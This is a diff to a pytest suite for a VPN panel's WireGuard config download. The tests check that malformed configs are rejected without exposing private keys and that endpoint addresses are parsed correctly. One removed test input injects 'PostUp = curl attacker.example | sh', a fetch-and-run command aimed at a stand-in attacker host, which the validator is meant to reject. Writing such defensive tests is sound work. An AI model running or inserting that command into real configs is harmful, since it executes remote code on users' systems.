@@ -49,18 +49,44 @@ def test_download_verifies_identity_and_ignores_remote_filename():
     assert result == CONFIG and len(calls) == 3
 
 
-@pytest.mark.parametrize('raw', [CONFIG.replace(PRIVATE,SERVER_KEY),
-    CONFIG.replace('Address = 10.0.0.2/32','Address = invalid'),
-    CONFIG.replace('0.0.0.0/0, ::/0','invalid'),
-    CONFIG.replace('vpn.example:51820','vpn.example:70000'),
-    CONFIG.replace('[Peer]','PostUp = curl attacker.example | sh\n[Peer]'),
-    CONFIG+'\n[Unexpected]\nx=y', CONFIG+'\n[Peer]\n', 'x'*16385,
-    CONFIG.replace('PublicKey = '+SERVER_KEY,'PublicKey = invalid')])
-def test_bad_or_dangerous_config_is_rejected_without_echoing_secrets(raw):
-    with pytest.raises(PanelError) as error:download(raw)
+@pytest.mark.parametrize(('raw', 'code'), [
+    (CONFIG.replace(PRIVATE, SERVER_KEY), 'WGDashboardConfigPrivateKey'),
+    (CONFIG.replace('10.0.0.2/32', 'invalid'), 'WGDashboardConfigAddress'),
+    (CONFIG.replace('0.0.0.0/0, ::/0', 'invalid'), 'WGDashboardConfigAllowedIPs'),
+    (CONFIG.replace('vpn.example:51820', 'vpn.example:70000'), 'WGDashboardConfigEndpoint'),
+    (CONFIG.replace('[Peer]', 'PostUp = invalid\n[Peer]'), 'WGDashboardConfigFields'),
+    (CONFIG+'\n[Unexpected]\nx=y', 'WGDashboardConfigSections'),
+    (CONFIG+'\n[Peer]\n', 'WGDashboardConfigSections'),
+    ('x'*16385, 'UnsupportedWGDashboardConfig'),
+    (CONFIG.replace('PublicKey = '+SERVER_KEY, 'PublicKey = invalid'), 'WGDashboardConfigPublicKey'),
+])
+def test_bad_or_dangerous_config_is_rejected_without_echoing_secrets(raw, code):
+    with pytest.raises(PanelError) as error:
+        download(raw)
+    assert error.value.args == (code,)
     assert PRIVATE not in str(error.value) and SERVER_KEY not in str(error.value)
 
 
 @pytest.mark.parametrize('state',['missing','restricted'])
 def test_only_active_peer_can_be_downloaded(state):
     with pytest.raises(PanelError,match='PeerUnavailable'):download(state=state)
+
+@pytest.mark.parametrize('broken', ['https://vpn.example/:51820', 'http://vpn.example:51820'])
+def test_wgdashboard_url_prefix_with_single_udp_port(broken):
+    result, _ = download(CONFIG.replace('vpn.example:51820', broken))
+    assert 'Endpoint = vpn.example:51820' in result.splitlines()
+
+
+@pytest.mark.parametrize('broken', [':51820', 'https://vpn.example/api:51820',
+                                    'https://vpn.example:443:51820', 'https://name@vpn.example:51820'])
+def test_ambiguous_addresses_require_panel_correction(broken):
+    with pytest.raises(PanelError, match='WGDashboardConfigEndpoint'):
+        download(CONFIG.replace('vpn.example:51820', broken))
+
+
+@pytest.mark.parametrize('host', ['vpn.example', '192.0.2.3', '[2001:db8::2]'])
+def test_wgdashboard_duplicate_listen_port_is_unambiguous(host):
+    result, _ = download(CONFIG.replace('vpn.example:51820', host+':51820:51820'))
+    assert ('Endpoint = '+host+':51820') in result.splitlines()
+    with pytest.raises(PanelError, match='WGDashboardConfigEndpoint'):
+        download(CONFIG.replace('vpn.example:51820', host+':51821:51820'))
